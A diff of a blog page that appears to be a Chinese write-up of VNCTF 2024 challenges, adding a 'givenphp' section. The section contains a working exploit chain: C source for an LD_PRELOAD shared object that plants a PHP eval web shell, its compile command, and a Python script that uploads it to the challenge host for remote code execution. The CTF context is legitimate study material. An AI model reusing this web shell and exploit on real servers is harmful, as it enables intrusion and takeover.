@@ -47,8 +47,8 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
 
 <!-- title、keywords、desc关键字 -->
 
-  <title>留言板</title>
-  <meta name="title" content="留言板" />
+  <title>关于</title>
+  <meta name="title" content="关于" />
 
 
 
@@ -106,8 +106,9 @@ daovoice('update');
 <meta property="og:image" content="https://img.hzy2003628.top/1708139565373-e26e593a-4d96-4a61-a0b5-866f8fa386e7.png">
 <meta property="og:image" content="https://img.hzy2003628.top/1708140708133-5a91293f-f402-4010-9694-0c36954a4ffd.png">
 <meta property="og:image" content="https://img.hzy2003628.top/1708149862882-5c1ebde8-a094-4eb7-aeba-047cf751bad0.png">
+<meta property="og:image" content="https://img.hzy2003628.top/image-20240218205810441.png">
 <meta property="article:published_time" content="2024-02-17T13:20:46.000Z">
-<meta property="article:modified_time" content="2024-02-18T10:55:24.027Z">
+<meta property="article:modified_time" content="2024-02-18T14:33:52.205Z">
 <meta property="article:author" content="故里">
 <meta property="article:tag" content="赛后复盘">
 <meta property="article:tag" content="CTF">
@@ -353,7 +354,7 @@ daovoice('update');
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-02-18 18:55:24" itemprop="dateModified" datetime="2024-02-18T18:55:24+08:00">2024-02-18</time>
+                <time title="修改时间：2024-02-18 22:33:52" itemprop="dateModified" datetime="2024-02-18T22:33:52+08:00">2024-02-18</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -397,14 +398,14 @@ daovoice('update');
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>4.1k</span>
+              <span>6.5k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
+              <span>6 分钟</span>
             </span>
 
         </div>
@@ -570,6 +571,100 @@ match list(i()):
 <pre><code class="hljs plaintext">../../../home/ming/share_main/f</code></pre>
 <img src="https://img.hzy2003628.top/1708149862882-5c1ebde8-a094-4eb7-aeba-047cf751bad0.png" alt="image.png" style="zoom:200%;">
 <p>VNCTF{564e406840636b3156315f6764676d}</p>
+<h2 id="givenphp复现">givenphp【复现】</h2>
+<p>题目源码</p>
+<pre><code class="hljs plaintext">&lt;?php
+highlight_file(__FILE__);
+if(isset($_POST[&#x27;upload&#x27;]))&#123;
+    handleFileUpload($_FILES[&#x27;file&#x27;]);
+&#125;
+
+if(isset($_GET[&#x27;challenge&#x27;]))&#123;
+    waf();
+    $value=$_GET[&#x27;value&#x27;];
+    $key=$_GET[&#x27;key&#x27;];
+    $func=create_function(&quot;&quot;,&quot;putenv(&#x27;$key=$value&#x27;);&quot;);
+    if($func==$_GET[&#x27;guess&#x27;])&#123;
+        $func();
+        system(&quot;whoami&quot;);
+    &#125;
+&#125;
+function waf()
+&#123;
+    if(preg_match(&#x27;/\&#x27;|&quot;|%|\(|\)|;|bash/i&#x27;,$_GET[&#x27;key&#x27;])||preg_match(&#x27;/\&#x27;|&quot;|%|\(|\)|;|bash/i&#x27;,$_GET[&#x27;value&#x27;]))&#123;
+        die(&quot;evil input!!!&quot;);
+    &#125;
+&#125;
+function handleFileUpload($file)
+&#123;
+    $uploadDirectory = &#x27;/tmp/&#x27;;
+
+    if ($file[&#x27;error&#x27;] !== UPLOAD_ERR_OK) &#123;
+        echo &#x27;文件上传失败。&#x27;;
+        return;
+    &#125;
+    $fileExtension = pathinfo($file[&#x27;name&#x27;], PATHINFO_EXTENSION);
+
+    $newFileName = uniqid(&#x27;uploaded_file_&#x27;, true) . &#x27;.&#x27; . $fileExtension;
+    $destination = $uploadDirectory . $newFileName;
+    if (move_uploaded_file($file[&#x27;tmp_name&#x27;], $destination)) &#123;
+        echo $destination;
+    &#125; else &#123;
+        echo &#x27;文件移动失败。&#x27;;
+    &#125;
+&#125;</code></pre>
+<p>上传功能和设置环境变量</p>
+<blockquote>
+<p>putenv–环境变量注入的标志</p>
+</blockquote>
+<p>结合题目本身具备的这俩功能，不难想到考点是LD_PRELOAD劫持，来劫持whoami达到执行自己命令的目的</p>
+<pre><code class="hljs plaintext">步骤:
+1.利用上传功能上传so文件（/tmp/1.so）
+2.利用已知so文件上传路径来设置环境变量，LD_PRELOAD=$PWD/1.so</code></pre>
+<p><a target="_blank" rel="noopener" href="http://1.so">1.so</a></p>
+<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int puts(const char *message) &#123;
+  system(&quot;echo &#x27;&lt;?php eval($_POST[0]);&#x27; &gt; /var/www/html/1.php&quot;);
+  
+  return 0;
+&#125;</code></pre>
+<p>编译成so文件</p>
+<pre><code class="hljs plaintext">gcc 1.c -o 1.so -fPIC -shared -ldl -D_GNU_SOURCE</code></pre>
+<p>然后看这一段代码，有个判断，这个本地输出一下会发现是%00lambda_num（num递增）</p>
+<pre><code class="hljs plaintext">$func=create_function(&quot;&quot;,&quot;putenv(&#x27;$key=$value&#x27;);&quot;);
+//var_dump(($func));
+if($func==$_GET[&#x27;guess&#x27;])&#123;
+    $func();
+    system(&quot;whoami&quot;);
+&#125;</code></pre>
+<p>理清楚了就直接先上传so文件然后按照要求传参即可【第一次传参的话就是%00lambda_1】</p>
+<pre><code class="hljs plaintext">import requests
+
+url = &quot;http://b9bf6b64-3c2c-487c-a20c-662c2ea17b19.vnctf2024.manqiu.top/&quot;
+
+data = &#123;
+    &quot;upload&quot;:1
+&#125;
+file = &#123;
+    &quot;file&quot;:open(&#x27;D:\/比赛\/vnctf\/WEB\/givenphp/1.so&#x27;,&#x27;rb&#x27;)
+&#125;
+r = requests.post(url,data=data,files=file)
+fn = r.text[-45:].strip()
+
+param = &#123;
+    &quot;challenge&quot;:1,
+    &quot;key&quot;:&quot;LD_PRELOAD&quot;,
+    &quot;value&quot;:fn,
+    &quot;guess&quot;:&#x27;\x00lambda_1&#x27;
+&#125;
+r = requests.get(url,params=param)
+print(r.text)</code></pre>
+<p>然后访问1.php即可RCE</p>
+<img src="https://img.hzy2003628.top/image-20240218205810441.png" alt="image-20240218205810441" style="zoom:200%;">
+<p>当然也可以反弹shell，直接改so文件就行</p>
+<p>vnctf{df7974bc-8abb-431f-9fc4-c90b686f9db9}</p>
 
     </div>
 
@@ -697,7 +792,7 @@ match list(i()):
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlshark"><span class="nav-number">2.1.</span> <span class="nav-text">sqlshark</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#onlylocalsql"><span class="nav-number">2.2.</span> <span class="nav-text">OnlyLocalSql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pyjail%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.3.</span> <span class="nav-text">pyjail【复现】</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">3.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#checkin"><span class="nav-number">3.1.</span> <span class="nav-text">Checkin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#trysent"><span class="nav-number">3.2.</span> <span class="nav-text">TrySent</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cutepath"><span class="nav-number">3.3.</span> <span class="nav-text">CutePath</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlshark"><span class="nav-number">2.1.</span> <span class="nav-text">sqlshark</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#onlylocalsql"><span class="nav-number">2.2.</span> <span class="nav-text">OnlyLocalSql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pyjail%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.3.</span> <span class="nav-text">pyjail【复现】</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">3.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#checkin"><span class="nav-number">3.1.</span> <span class="nav-text">Checkin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#trysent"><span class="nav-number">3.2.</span> <span class="nav-text">TrySent</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cutepath"><span class="nav-number">3.3.</span> <span class="nav-text">CutePath</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#givenphp%E5%A4%8D%E7%8E%B0"><span class="nav-number">3.4.</span> <span class="nav-text">givenphp【复现】</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -1092,7 +1187,7 @@ match list(i()):
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">20:10</span>
+    <span title="站点阅读时长">20:12</span>
 </div>
 
 
